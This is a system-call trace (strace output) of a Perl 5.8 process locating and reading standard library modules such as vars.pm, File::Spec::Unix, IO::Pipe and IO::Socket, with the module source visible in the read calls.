10195 07:31:50.944933 stat64("/usr/lib/perl5/vars.pmc", 0xbfc5684c) = -1 ENOENT (No such file or directory)
10195 07:31:50.944945 stat64("/usr/lib/perl5/vars.pm", 0xbfc5675c) = -1 ENOENT (No such file or directory)
10195 07:31:50.944958 stat64("/usr/share/perl5/vars.pmc", 0xbfc5684c) = -1 ENOENT (No such file or directory)
10195 07:31:50.944969 stat64("/usr/share/perl5/vars.pm", 0xbfc5675c) = -1 ENOENT (No such file or directory)
10195 07:31:50.944982 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfc5684c) = -1 ENOENT (No such file or directory)
10195 07:31:50.944994 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfc5675c) = -1 ENOENT (No such file or directory)
10195 07:31:50.945008 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfc5684c) = -1 ENOENT (No such file or directory)
10195 07:31:50.945020 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
10195 07:31:50.945040 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
10195 07:31:50.945053 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56568) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.945065 _llseek(10, 0, [0], SEEK_CUR) = 0
10195 07:31:50.945081 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
10195 07:31:50.945196 stat64("/etc/perl/warnings/register.pmc", 0xbfc5639c) = -1 ENOENT (No such file or directory)
10195 07:31:50.945211 stat64("/etc/perl/warnings/register.pm", 0xbfc562ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.945225 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfc5639c) = -1 ENOENT (No such file or directory)
10195 07:31:50.945238 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfc562ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.945252 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfc5639c) = -1 ENOENT (No such file or directory)
10195 07:31:50.945265 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfc562ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.945280 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfc5639c) = -1 ENOENT (No such file or directory)
10195 07:31:50.945292 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfc562ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.945316 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfc5639c) = -1 ENOENT (No such file or directory)
10195 07:31:50.945357 stat64("/usr/share/perl5/warnings/register.pm", 0xbfc562ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.945385 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfc5639c) = -1 ENOENT (No such file or directory)
10195 07:31:50.945399 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfc562ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.945413 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfc5639c) = -1 ENOENT (No such file or directory)
10195 07:31:50.945426 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
10195 07:31:50.945448 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
10195 07:31:50.945463 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc560b8) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.945475 _llseek(11, 0, [0], SEEK_CUR) = 0
10195 07:31:50.945493 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
10195 07:31:50.945650 read(11, "", 4096) = 0
10195 07:31:50.945663 close(11)         = 0
10195 07:31:50.945937 _llseek(10, 1148, [1148], SEEK_SET) = 0
10195 07:31:50.945954 _llseek(10, 0, [1148], SEEK_CUR) = 0
10195 07:31:50.945964 close(10)         = 0
10195 07:31:50.946032 _llseek(8, 594, [594], SEEK_SET) = 0
10195 07:31:50.946046 _llseek(8, 0, [594], SEEK_CUR) = 0
10195 07:31:50.946056 close(8)          = 0
10195 07:31:50.946089 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.946104 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.946118 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.946135 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.946149 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.946162 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.946176 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.946189 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.946202 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.946214 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.946228 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.946241 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.946255 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.946268 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
10195 07:31:50.946289 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
10195 07:31:50.946318 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56a18) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.946357 _llseek(8, 0, [0], SEEK_CUR) = 0
10195 07:31:50.946392 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
10195 07:31:50.947076 brk(0x8218000)    = 0x8218000
10195 07:31:50.954113 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
10195 07:31:50.954590 read(8, "", 4096) = 0
10195 07:31:50.954609 close(8)          = 0
10195 07:31:50.954923 read(6, "", 4096) = 0
10195 07:31:50.954943 close(6)          = 0
10195 07:31:50.955155 stat64("/etc/perl/IO/Pipe.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.955172 stat64("/etc/perl/IO/Pipe.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.955187 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.955199 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.955214 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.955226 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.955240 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.955251 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.955264 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.955276 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.955289 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.955302 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
10195 07:31:50.955364 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
10195 07:31:50.955380 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56ec8) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.955406 _llseek(6, 0, [0], SEEK_CUR) = 0
10195 07:31:50.955427 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
10195 07:31:50.956119 _llseek(6, 3425, [3425], SEEK_SET) = 0
10195 07:31:50.956138 _llseek(6, 0, [3425], SEEK_CUR) = 0
10195 07:31:50.956148 close(6)          = 0
10195 07:31:50.956172 stat64("/etc/perl/IO/Socket.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.956186 stat64("/etc/perl/IO/Socket.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.956200 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.956213 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.956227 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.956240 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.956254 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.956266 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.956279 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.956290 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.956317 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.956361 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
10195 07:31:50.956400 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
10195 07:31:50.956432 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56ec8) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.956447 _llseek(6, 0, [0], SEEK_CUR) = 0
10195 07:31:50.956465 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
10195 07:31:50.956783 stat64("/etc/perl/Socket.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.956808 stat64("/etc/perl/Socket.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.956824 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
